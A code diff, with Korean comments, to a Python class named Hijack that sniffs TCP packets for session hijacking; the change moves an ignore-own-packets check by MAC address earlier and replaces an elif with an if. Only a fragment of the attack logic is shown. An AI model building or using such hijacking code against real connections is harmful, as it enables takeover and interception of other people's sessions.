@@ -41,6 +41,10 @@ class Hijack:
 		tcp = packet.getlayer("TCP")
 		flags = tcp.sprintf("%flags%")
 
+		if packet["Ether"].src == self.my_mac:
+			print("내가 보낸 패킷이라 무시")
+			return
+
 		print("Got packet %s:%d -> %s:%d [%s] from %s" % (ip.src, tcp.sport, ip.dst, tcp.dport, flags, packet["Ether"].src if packet.haslayer("Ether") else "?"))
 
 		#Check if this is a hijackable packet
@@ -48,12 +52,8 @@ class Hijack:
 
 			payload_len = len(packet.getlayer("Raw").load) if packet.haslayer("Raw") else 0
 
-			if packet["Ether"].src == self.my_mac:
-				print("내가 보낸 패킷이라 무시")
-				return
-
 			#The packet is from server to client
-			elif tcp.sport == self.srv_port and ip.src == self.srv_ip and ip.dst == self.client_ip:
+			if tcp.sport == self.srv_port and ip.src == self.srv_ip and ip.dst == self.client_ip:
 				print("server -> client 패킷:  seq=%d ack=%d payload_len=%d" % (tcp.seq, tcp.ack, payload_len))
 
 				if not self.hijacked:
